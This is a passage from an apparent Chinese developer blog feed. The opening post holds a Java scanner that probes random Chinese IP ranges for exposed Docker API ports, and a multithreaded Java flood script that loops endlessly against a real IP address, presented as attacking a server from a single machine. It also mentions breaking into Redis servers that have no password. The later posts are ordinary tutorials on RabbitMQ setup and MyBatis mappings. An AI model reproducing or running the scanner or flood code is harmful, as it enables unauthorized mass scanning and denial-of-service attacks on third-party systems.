class="number">4</span>];</span><br><span class="line">        String x = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        b[<span class="number">0</span>] = (<span class="keyword">int</span>) ((ip &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        b[<span class="number">1</span>] = (<span class="keyword">int</span>) ((ip &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        b[<span class="number">2</span>] = (<span class="keyword">int</span>) ((ip &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        b[<span class="number">3</span>] = (<span class="keyword">int</span>) (ip &amp; <span class="number">0xff</span>);</span><br><span class="line">        x = Integer.toString(b[<span class="number">0</span>]) + <span class="string">"."</span> + Integer.toString(b[<span class="number">1</span>]) + <span class="string">"."</span> + Integer.toString(b[<span class="number">2</span>]) + <span class="string">"."</span> + Integer.toString(b[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="扫描随机远程docker"><a href="#扫描随机远程docker" class="headerlink" title="扫描随机远程docker"></a>扫描随机远程docker</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">65535</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">65535</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> finalI = i;</span><br><span class="line">            Callable&lt;Integer&gt; task = () -&gt; &#123;</span><br><span class="line">                String ip = getRandomIp();</span><br><span class="line">                <span class="keyword">boolean</span> hostConnectable = isHostConnectable(ip, <span class="number">2375</span>);</span><br><span class="line">                <span class="keyword">if</span> (hostConnectable)&#123;</span><br><span class="line">                    System.out.println(ip);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> finalI;</span><br><span class="line">            &#125;;</span><br><span class="line">            Future&lt;Integer&gt; future = executorService.submit(task);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Integer s = future.get(<span class="number">1</span>, TimeUnit.MICROSECONDS);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"======================"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isHostConnectable</span><span class="params">(String host, <span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            socket.connect(<span class="keyword">new</span> InetSocketAddress(host, port));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                socket.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ignored) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 随机生成国内IP地址</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getRandomIp</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ip范围</span></span><br><span class="line">        <span class="keyword">int</span>[][] range = &#123; &#123; <span class="number">607649792</span>, <span class="number">608174079</span> &#125;,<span class="comment">// 36.56.0.0-36.63.255.255</span></span><br><span class="line">                &#123; <span class="number">1038614528</span>, <span class="number">1039007743</span> &#125;,<span class="comment">// 61.232.0.0-61.237.255.255</span></span><br><span class="line">                &#123; <span class="number">1783627776</span>, <span class="number">1784676351</span> &#125;,<span class="comment">// 106.80.0.0-106.95.255.255</span></span><br><span class="line">                &#123; <span class="number">2035023872</span>, <span class="number">2035154943</span> &#125;,<span class="comment">// 121.76.0.0-121.77.255.255</span></span><br><span class="line">                &#123; <span class="number">2078801920</span>, <span class="number">2079064063</span> &#125;,<span class="comment">// 123.232.0.0-123.235.255.255</span></span><br><span class="line">                &#123; -<span class="number">1950089216</span>, -<span class="number">1948778497</span> &#125;,<span class="comment">// 139.196.0.0-139.215.255.255</span></span><br><span class="line">                &#123; -<span class="number">1425539072</span>, -<span class="number">1425014785</span> &#125;,<span class="comment">// 171.8.0.0-171.15.255.255</span></span><br><span class="line">                &#123; -<span class="number">1236271104</span>, -<span class="number">1235419137</span> &#125;,<span class="comment">// 182.80.0.0-182.92.255.255</span></span><br><span class="line">                &#123; -<span class="number">770113536</span>, -<span class="number">768606209</span> &#125;,<span class="comment">// 210.25.0.0-210.47.255.255</span></span><br><span class="line">                &#123; -<span class="number">569376768</span>, -<span class="number">564133889</span> &#125;, <span class="comment">// 222.16.0.0-222.95.255.255</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Random rdint = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">int</span> index = rdint.nextInt(<span class="number">10</span>);</span><br><span class="line">        String ip = num2ip(range[index][<span class="number">0</span>] + <span class="keyword">new</span> Random().nextInt(range[index][<span class="number">1</span>] - range[index][<span class="number">0</span>]));</span><br><span class="line">        <span class="keyword">return</span> ip;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 将十进制转换成ip地址</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">num2ip</span><span class="params">(<span class="keyword">int</span> ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] b = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">4</span>];</span><br><span class="line">        String x = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        b[<span class="number">0</span>] = (<span class="keyword">int</span>) ((ip &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        b[<span class="number">1</span>] = (<span class="keyword">int</span>) ((ip &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        b[<span class="number">2</span>] = (<span class="keyword">int</span>) ((ip &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        b[<span class="number">3</span>] = (<span class="keyword">int</span>) (ip &amp; <span class="number">0xff</span>);</span><br><span class="line">        x = Integer.toString(b[<span class="number">0</span>]) + <span class="string">"."</span> + Integer.toString(b[<span class="number">1</span>]) + <span class="string">"."</span> + Integer.toString(b[<span class="number">2</span>]) + <span class="string">"."</span> + Integer.toString(b[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>批量打开url：<a href="https://www.openurl.cn/" target="_blank" rel="noopener">https://www.openurl.cn/</a></p><h1 id="单机打服务器"><a href="#单机打服务器" class="headerlink" title="单机打服务器"></a>单机打服务器</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DD</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ExecutorService es = Executors.newFixedThreadPool(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">            es.execute(DD::ddd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ddd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                URL url = <span class="keyword">new</span> URL(<span class="string">"http://27.221.78.209"</span>);</span><br><span class="line">                URLConnection conn = url.openConnection();</span><br><span class="line">                System.out.println(<span class="string">"发包成功！"</span>);</span><br><span class="line">                BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(</span><br><span class="line">                        conn.getInputStream());</span><br><span class="line">                <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">                StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((len = bis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    sb.append(<span class="keyword">new</span> String(bytes, <span class="number">0</span>, len));</span><br><span class="line">                    bis.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line"><span class="comment">//                e.printStackTrace();</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line"><span class="comment">//                e.printStackTrace();</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="安装kali"><a href="#安装kali" class="headerlink" title="安装kali"></a>安装kali</h1><p>Kali是安全从业人员常用的Linux系统，自带有大量安全工具集。</p><p>从阿里云开源镜像站下载<a href="https://mirrors.aliyun.com/kali-images/" target="_blank" rel="noopener">https://mirrors.aliyun.com/kali-images/</a></p><h1 id="通过redis渗透服务器"><a href="#通过redis渗透服务器" class="headerlink" title="通过redis渗透服务器"></a>通过redis渗透服务器</h1><p>目前很多redis都没有设置密码，我们通过ip端口就可以直接连接redis。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>RabbitMQ的基本使用</title>
    <url>/2020/08/18/19840/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><p>之前用过activeMQ，zeroMQ，但是都是公司要用，并非自己选型，且从来没有考虑过消息幂等性问题，决定使用MQ就要承担使用MQ后的带来的系统复杂程度提高。看过好几个MQ对比，决定看看RabbitMQ和RocketMQ，今天先快速了解一下RabbitMQ。</p><h1 id="RabbitMQ快速入门"><a href="#RabbitMQ快速入门" class="headerlink" title="RabbitMQ快速入门"></a>RabbitMQ快速入门</h1><h2 id="安装RabbitMQ"><a href="#安装RabbitMQ" class="headerlink" title="安装RabbitMQ"></a>安装RabbitMQ</h2><p>拉取RabbitMQ带web界面的镜像。<code>docker pull rabbitmq:management</code></p><p>启动容器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --restart=always --name rabbitmq -p 5672:5672 -p 6006:15672 -v /usr/project/docker/rabbitmq/data:/var/lib/rabbitmq rabbitmq:management</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      <tags>
        <tag>消息队列</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis的基础使用</title>
    <url>/2020/08/11/59904/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><p>mybatis是目前比较主流的ORM框架，今天对mybatis的一些基础用法做一总结记录。</p><a id="more"></a><h1 id="常见入参方式"><a href="#常见入参方式" class="headerlink" title="常见入参方式"></a>常见入参方式</h1><ol><li><p>String，int，Long等</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xml中参数名可以随便写，注明parameterType</span><br><span class="line">如果是要进行非null的判断，if后直接那变量名进行判空，因为mybatis会默认变量名为_parameter，否则会报no getter/setter错误，可以在接口位置打上@Param注解，在if判断时，可以直接用变量名</span><br></pre></td></tr></table></figure></li><li><p>多个参数</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">在接口位置打上@Param注解，使用@Param 对应的value</span><br></pre></td></tr></table></figure></li><li><p>javabean</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">注明parameterType=<span class="string">"javabean类型"</span>，xml中直接使用javabean的属性名称</span><br><span class="line">Test test = <span class="keyword">new</span> Test();</span><br><span class="line">test.setField1(<span class="string">"上海铁路局"</span>);</span><br><span class="line">test.setField2(<span class="number">1</span>);</span><br><span class="line">Test r2 = testMapper.queryOnejava(test);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Test <span class="title">queryOnejava</span><span class="params">(Test test)</span></span>;</span><br><span class="line"></span><br><span class="line">&lt;select id=<span class="string">"queryOnejava"</span> parameterType=<span class="string">"com.xqh.railway.system.domain.Test"</span> resultType=<span class="string">"com.xqh.railway.system.domain.Test"</span>&gt;</span><br><span class="line">        select * from test where FIELD1 = #&#123;field1&#125; and FIELD2 = #&#123;field2&#125;</span><br><span class="line">    &lt;/select&gt;</span><br></pre></td></tr></table></figure></li><li><p>Map</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">注明parameterType="map"，xml中使用map的key</span><br><span class="line"></span><br><span class="line">HashMap<span class="tag">&lt;<span class="name">String,</span> <span class="attr">Object</span>&gt;</span> hashMap1 = new HashMap<span class="tag">&lt;&gt;</span>();</span><br><span class="line">hashMap1.put("field1","上海铁路局");</span><br><span class="line">hashMap1.put("field2","1");</span><br><span class="line">Test r1 = testMapper.queryOne(hashMap1);</span><br><span class="line">    </span><br><span class="line">public Test queryOne(Map<span class="tag">&lt;<span class="name">String,Object</span>&gt;</span> map);</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"queryOne"</span> <span class="attr">parameterType</span>=<span class="string">"map"</span> <span class="attr">resultType</span>=<span class="string">"com.xqh.railway.system.domain.Test"</span>&gt;</span></span><br><span class="line">     select * from test where FIELD1 = #&#123;field1&#125; and FIELD2 = #&#123;field2&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>List</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">public List<span class="tag">&lt;<span class="name">Test</span>&gt;</span> findByList(List<span class="tag">&lt;<span class="name">String</span>&gt;</span> list);</span><br><span class="line"># 参数没有用@Param，collection默认为list，如果用@Param，则collection为@param的value值</span><br><span class="line"># 如果List中为JavaBean，#&#123;&#125;中应写item值.属性名</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findByList"</span> <span class="attr">resultType</span>=<span class="string">"com.xqh.railway.system.domain.Test"</span> &gt;</span></span><br><span class="line">SELECT * from test where FIELD1 in</span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">"list"</span> <span class="attr">open</span>=<span class="string">"("</span> <span class="attr">separator</span>=<span class="string">","</span> <span class="attr">close</span>=<span class="string">")"</span> <span class="attr">item</span>=<span class="string">"field1"</span>&gt;</span></span><br><span class="line">      #&#123;field1&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>复杂参数</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">public List<span class="tag">&lt;<span class="name">Test</span>&gt;</span> findByList(@Param("id") String id, @Param("testList")List<span class="tag">&lt;<span class="name">Test</span>&gt;</span> list);</span><br><span class="line"># 参数没有用@Param，collection默认为list，如果用@Param，则collection为@param的value值</span><br><span class="line"># 如果List中为JavaBean，#&#123;&#125;中应写item值.属性名</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"findByList"</span> <span class="attr">resultType</span>=<span class="string">"com.xqh.railway.system.domain.Test"</span> &gt;</span></span><br><span class="line">SELECT * from test where </span><br><span class="line">    id = #&#123;id&#125;</span><br><span class="line">    and</span><br><span class="line">    FIELD1 in</span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">"testList"</span> <span class="attr">open</span>=<span class="string">"("</span> <span class="attr">separator</span>=<span class="string">","</span> <span class="attr">close</span>=<span class="string">")"</span> <span class="attr">item</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line">      #&#123;test.field1&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="常见返回对象封装"><a href="#常见返回对象封装" class="headerlink" title="常见返回对象封装"></a>常见返回对象封装</h1><ol><li>javabean<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">注明resultType="javabean类型"</span><br></pre></td></tr></table></figure></li><li>map<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">注明resultType="map"，map的key为数据库字段名，大小写和数据库保持一致</span><br></pre></td></tr></table></figure></li><li>list<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">注明resultType="list的泛型"</span><br></pre></td></tr></table></figure></li></ol><h1 id="resultMap的使用"><a href="#resultMap的使用" class="headerlink" title="resultMap的使用"></a>resultMap的使用</h1><h2 id="简单解释"><a href="#简单解释" class="headerlink" title="简单解释"></a>简单解释</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--column不做限制，可以为任意表的字段，而property须为type 定义的pojo属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"唯一的标识"</span> <span class="attr">type</span>=<span class="string">"映射的pojo对象"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"表的主键字段，或者可以为查询语句中的别名字段"</span> <span class="attr">jdbcType</span>=<span class="string">"字段类型"</span> <span class="attr">property</span>=<span class="string">"映射pojo对象的主键属性"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"表的一个字段（可以为任意表的一个字段）"</span> <span class="attr">jdbcType</span>=<span class="string">"字段类型"</span> <span class="attr">property</span>=<span class="string">"映射到pojo对象的一个属性（须为type定义的pojo对象中的一个属性）"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"pojo的一个对象属性"</span> <span class="attr">javaType</span>=<span class="string">"pojo关联的pojo对象"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"关联pojo对象对应表的主键字段"</span> <span class="attr">jdbcType</span>=<span class="string">"字段类型"</span> <span class="attr">property</span>=<span class="string">"关联pojo对象的主席属性"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span>  <span class="attr">column</span>=<span class="string">"任意表的字段"</span> <span class="attr">jdbcType</span>=<span class="string">"字段类型"</span> <span class="attr">property</span>=<span class="string">"关联pojo对象的属性"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 集合中的property须为oftype定义的pojo对象的属性--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">"pojo的集合属性"</span> <span class="attr">ofType</span>=<span class="string">"集合中的pojo对象"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"集合中pojo对象对应的表的主键字段"</span> <span class="attr">jdbcType</span>=<span class="string">"字段类型"</span> <span class="attr">property</span>=<span class="string">"集合中pojo对象的主键属性"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"可以为任意表的字段"</span> <span class="attr">jdbcType</span>=<span class="string">"字段类型"</span> <span class="attr">property</span>=<span class="string">"集合中的pojo对象的属性"</span> /&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">"com.xqh.railway.railwaybureau.domain.Project"</span> <span class="attr">id</span>=<span class="string">"projectMap"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"ID"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"lineId"</span> <span class="attr">column</span>=<span class="string">"LINE_ID"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"NAME"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"type"</span> <span class="attr">column</span>=<span class="string">"TYPE"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"projectType"</span> <span class="attr">column</span>=<span class="string">"PROJECT_TYPE"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"status"</span> <span class="attr">column</span>=<span class="string">"STATUS"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"startLength"</span> <span class="attr">column</span>=<span class="string">"START_LENGTH"</span> <span class="attr">jdbcType</span>=<span class="string">"NUMERIC"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"endLength"</span> <span class="attr">column</span>=<span class="string">"END_LENGTH"</span> <span class="attr">jdbcType</span>=<span class="string">"NUMERIC"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"createTime"</span> <span class="attr">column</span>=<span class="string">"CREATE_TIME"</span> <span class="attr">jdbcType</span>=<span class="string">"TIMESTAMP"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"modifyTime"</span> <span class="attr">column</span>=<span class="string">"MODIFY_TIME"</span> <span class="attr">jdbcType</span>=<span class="string">"TIMESTAMP"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"endTime"</span> <span class="attr">column</span>=<span class="string">"END_TIME"</span> <span class="attr">jdbcType</span>=<span class="string">"TIMESTAMP"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"plan"</span> <span class="attr">column</span>=<span class="string">"PLAN"</span> <span class="attr">jdbcType</span>=<span class="string">"NUMERIC"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"complete"</span> <span class="attr">column</span>=<span class="string">"COMPLETE"</span> <span class="attr">jdbcType</span>=<span class="string">"NUMERIC"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"planDay"</span> <span class="attr">column</span>=<span class="string">"PLAN_DAY"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"useDay"</span> <span class="attr">column</span>=<span class="string">"USE_DAY"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"line"</span> <span class="attr">javaType</span>=<span class="string">"com.xqh.railway.railwaybureau.domain.Line"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"LID"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"id"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span>  <span class="attr">column</span>=<span class="string">"LNAME"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span class="string">"name"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">"testUnitList"</span> <span class="attr">ofType</span>=<span class="string">"com.xqh.railway.system.domain.Unit"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"UNIT_ID"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span> <span class="attr">property</span>=<span class="string">"unitId"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"UNIT_NAME"</span> <span class="attr">jdbcType</span>=<span class="string">"VARCHAR"</span> <span class="attr">property</span>=<span class="string">"unitName"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="mybatis中-lt-CDATA-gt-的作用"><a href="#mybatis中-lt-CDATA-gt-的作用" class="headerlink" title="mybatis中&lt;![CDATA[]]&gt;的作用"></a>mybatis中<code>&lt;![CDATA[]]&gt;</code>的作用</h1><p>在使用mybatis 时我们sql是写在xml 映射文件中，如果写的sql中有一些特殊的字符的话，在解析xml文件的时候会被转义，但我们不希望他被转义，所以我们要使用来解决。</p><p>被<code>&lt;![CDATA[]]&gt;</code>这个标记所包含的内容将表示为<strong>纯文本</strong>，比如<code>&lt;![CDATA[&lt;]]&gt;</code>表示文本内容<code>“&lt;”</code>。<br>此标记用于xml文档中，我们先来看看使用转义符的情况。我们知道，在xml中，<code>”&lt;”</code>、<code>”&gt;”</code>、<code>”&amp;”</code>等字符是不能直接存入的，否则xml语法检查时会<strong>报错</strong>，如果想在xml中使用这些符号，必须将其转义为实体，如<code>”&amp;lt;”</code>、<code>”&amp;gt;”</code>、<code>”&amp;amp;”</code>，这样才能保存进xml文档。</p><p>在XML中，需要转义的字符有：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在XML中，需要转义的字符有：</span><br><span class="line">&amp;　　　&amp;</span><br><span class="line">&lt;　　　&lt;</span><br><span class="line">&gt;　　　&gt;</span><br><span class="line">＂　　　&quot;</span><br><span class="line">＇　　　&amp;apos;</span><br></pre></td></tr></table></figure><p><code>&lt;![CDATA[]]&gt;</code>和xml转移字符的关系，它们两个看起来是不是感觉功能重复了？<br>　　是的，它们的功能就是一样的，只是应用场景和需求有些不同：<br>　　(1)<code>&lt;![CDATA[]]&gt;</code>不能适用所有情况，转义字符可以；<br>　　(2) 对于短字符串<code>&lt;![CDATA[]]&gt;</code>写起来啰嗦，对于长字符串转义字符写起来可读性差；<br>　　(3) 